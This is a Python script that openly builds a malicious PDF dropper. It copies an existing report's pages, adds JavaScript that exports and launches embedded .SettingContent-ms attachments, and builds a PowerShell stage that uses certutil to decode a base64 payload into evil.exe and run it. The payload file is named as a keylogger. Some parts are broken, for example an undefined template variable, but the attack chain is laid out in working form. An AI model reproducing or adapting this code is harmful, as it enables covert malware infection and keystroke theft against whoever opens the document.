import base64
import binascii
import os

from PyPDF2 import PdfFileWriter, PdfFileReader

malicious_pdf = PdfFileWriter()

# Open file passed as -i parameter
with open("rapport_pop.pdf", "rb") as f:

    pdfReader = PdfFileReader(f)

    # Copy pages of original pdf file to malicious pdf file

    for page in range(pdfReader.numPages):

        pageObj = pdfReader.getPage(page)

        malicious_pdf.addPage(pageObj)

    malicious_pdf.addJS("var files = [\"Payload\", \"psFile\"]; for (var i = 0; i < files.length; i++) { this.exportDataObject( {cName: files[i] + \".SettingContent-ms\", nLaunch: 2} ); }")
    # malicious_pdf.addJS('this.exportDataObject({cName: "Payload.SettingContent-ms", nLaunch:2});')

    output = open("rapport_pop_malicious.pdf", "wb+")

    malicious_pdf.write(output)

    output.close()

    f.close()


# Check if payload provided is base64 encoded
def isBase64(payload, filename):
    isb64 = True
    if filename.endswith('.b64'):
        try:
            base64.b64decode(payload)
        except binascii.Error:
            isb64 = False
    else:
        isb64 = False
    return isb64


# Create payload file to embed
def create_putfile(payload, b64):
    putfile = scm.split("\n")
    if b64:
        payload = payload.decode()
        payload = payload.split('\n')
        payload = "".join(payload)
        putfile[6] = "Write-Output \"" + payload + "\" > $env:TEMP\\evil.b64 \n"
    else:
        payload = base64.b64encode(payload)
        payload = payload.decode()
        payload = payload.split('\n')
        payload = "".join(payload)

        putfile[6] = "Write-Output \"" + payload + "\" > $env:TEMP\\evil.b64 \n"

    return "\n".join(putfile)


# Create powershell script to embed in file and execute payload
def create_powershell():
    psFile = scm.split("\n")
    psFile[
        5] = "';$Store = $Store -replace([regex]::Escape($fpath + ':7:'), '');$Store = $Store -replace('', '');Invoke-Expression $Store; certutil -decode $env:TEMP\evil.b64 $env:TEMP\evil.exe; Invoke-Expression ($env:TEMP + '\evil.exe')]]>"

    return "\n".join(psFile)


# Insert payload and powershell script into pdf
def insertMaliciousFiles():
    raw_payload = ""
    # Read contents of payload file
    with open("MyKeyLogger.b64", "rb") as payload:
        raw_payload = payload.read()

    payload.close()
    # Check if payload is base64 encoded
    var = isBase64(raw_payload, "MyKeyLogger.b64")
    # Create malicious files
    put_file = create_putfile(raw_payload, var)
    psFile = create_powershell()
    files = [put_file, psFile]
    file_names = ["Payload.SettingContent-ms", "psFile.SettingContent-ms"]
    # Create the files, write to them and then attach them using pdftk
    malput = ["rapport_pop_malicious.pdf"]
    file_names.append(malput[0])
    for i in range(len(files)):
        tmp = open(file_names[i], "w")
        tmp.write(files[i])
        tmp.close()
        malput.append('out' + str(i) + '.pdf')
        file_names.append(malput[i + 1])
        os.system('pdftk ' + malput[i] + ' attach_file ' + file_names[i] + ' output ' + malput[i + 1])

    print("Attached encoded files!")
    return file_names


if __name__ == "__main__":
    insertMaliciousFiles()
